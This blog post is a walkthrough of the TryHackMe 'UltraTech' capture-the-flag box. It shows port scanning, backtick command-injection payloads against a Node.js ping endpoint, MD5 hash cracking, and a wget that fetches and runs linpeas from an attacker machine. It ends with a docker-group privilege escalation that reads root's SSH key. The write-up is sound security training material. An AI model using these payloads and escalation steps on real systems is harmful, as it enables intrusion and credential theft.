---
layout: post
title: " UltraTech - TryHackMe"
date: 2020-07-15
ctf: true
excerpt: "Walkthrough for UltraTech on TryHackme"
tags: [UltraTech, TryHackMe, node.js API, docker, hash cracking]
comments: false
---

UltraTech is a medium difficult box on [TryHackMe](https://www.tryhackme.com). Below are the steps I took to fully compromise this box.

Task 1 just requires deploying the machine, there is no challenge to solve.

### Task 2

First, let's run enumeration, the questions hint that non standard ports are used, so I ran **nmap -p- [machine ip]**. This took a bit to run since it was enumerating all the services on each port over the entire TCP port range. After a while, it returned the following results.

![UltraTech nmap1](/assets/img/UltraTech1.png)

Now lets run **nmap -A -p 21,22,8081,31331,35143 [machine ip]**  to enumerate these services further, which gets you the following information.

![UltraTech nmap2](/assets/img/UltraTech2.png)

We should now be able to answer some of the questions for this task. **Question 1** is shown above, which is node.js. **Question 2** is going to be the port Apache is running on that is not standard, which is the name of the service that answers **Question 3**.

**Question 4** is also in the scan above, which includes the name of the OS.

**Question 5** probably has several ways to figure it out, but I decided to enumerate the website on port 31331 to see what all was there. I enumerated the website with **gobuster dir -u http://[machine ip]:31331 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50**. Within a few moments, several directories showed up.

![UltraTech gobuster](/assets/img/UltraTech3.png)

Let's start looking at these directories. Since we know node.js is running, let's go to the **/js** directory first. 

![](/assets/img/UltraTech4.png)

This lists 3 different JavaScript files. Let's take a look at api.js.

![UltraTech api.js](/assets/img/UltraTech5.png)

This provides us with the answer to the question related to routes, as this script references port 8081 (where Node.js is setup). The two URLs indicated above are the routes that are in place, so the answer to this question is **2**. The other two files are just JavaScript scripts, and do not reference Node.js at all.

### Task 3

Now that we know the routes, it appears one of them is used for authentication. Let's see if we can figure out how to login. Visiting **http://[machine ip]:8081/auth** tells you you must specify a login and a password. Let's add in these two fields (login and password) to a request and see what happens. Let's use **http://[machine-ip]/auth?login=root&password=root**. It appears this request is in the correct format, as it tells us we're using invalid credentials.

![UltraTech auth](/assets/img/UltraTech6.png)

Next, let's look at the other route of **http://[machine ip]:8081/ping?ip=**. Let's use the backtick here to and enter in another command to see if we can perform command injection. I elected to use **http://[machine ip]:8081/ping?ip=\`whoami\`**.

![UltraTech node.js command injection whoami](/assets/img/UltraTech7.png)

Success! It returned a user of **www**. Next, let's see what's in the current directory with **http://[machine ip]:8081/ping?ip=\`ls\`**.

![UltraTech node.js command injection ls](/assets/img/UltraTech8.png)

This would be the answer to **Question 1** for Task 3.

It appears there is a sqlite database present. Let's view the contents with **http://[machine ip]:8081/ping?ip=\`cat [database name]\`**.

![UltraTech node.js command injection cat](/assets/img/UltraTech9.png)

This provides you with the hashes for two users, **r00t**, and **admin**. The hash for r00t is the answer to **Question 2** for Task 3Let's save their hashes to a text file named **hashes.txt**, one per line and see if we can crack them. Once saved, let's run the following command **john hashes.txt --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt**.

![UltraTech john](/assets/img/UltraTech10.png)

This will give you the credentials for both users. The password for r00t is the answer to **Question 3** for Task 3.

### Task 4

Next,  let's connect with **ssh r00t@[machine ip]** and enter the password we had cracked a few moments ago. The final task wants us to get root's first 9 characters of their private SSH key. Let's spin up a python server locally on our attacker pc with **python3 -m http.server**. From the victim PC, type in **wget http://[attacker machine ip]:8000/linpeas.sh**. Once downloaded, run **chmod +x linpeas.sh** and run it with **./linpeas.sh**.

![UltraTech linpeas.sh](/assets/img/UltraTech13.png)

Right at the very beginning, we find out that r00t is a member of the docker group. We could potentially escalate to root with this by following what is on the [GTFOBins](https://gtfobins.github.io/gtfobins/docker/) site for docker. However, since this machine doesn't have internet access, let's first list what images are available locally with **docker image ls**

![UltraTech docker image ls](/assets/img/UltraTech14.png)

Now, let's modify the command on the GTFOBins site above from docker run -v /:/mnt --rm -it alpine chroot /mnt sh to **docker run -v /:/mnt --rm -it bash chroot /mnt sh**. From here, navigate to the ssh keys folder with root with **cd root, cd .ssh** and **cat id_rsa** to answer **Question 1** for Task 4 and complete this box.

![](/assets/img/UltraTech15.png)
